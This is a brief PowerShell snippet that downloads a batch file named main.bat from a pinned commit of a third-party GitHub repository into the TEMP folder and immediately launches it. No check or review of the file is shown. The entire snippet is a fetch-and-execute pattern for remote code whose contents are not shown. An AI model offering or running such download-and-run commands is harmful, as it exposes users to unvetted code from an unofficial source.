# 1. Target the raw file content rather than the web preview
$url = "https://raw.githubusercontent.com/DevJeffersonL/MAS/6257eca084d95d777f9a8a1cb9a1fc805d5cce48/main.bat"
$destination = Join-Path -Path $env:TEMP -ChildPath "main.bat"

# 2. Download the raw batch script
Invoke-WebRequest -Uri $url -OutFile $destination -UseBasicParsing

# 3. Launch the batch file in a new console window
Start-Process -FilePath $destination
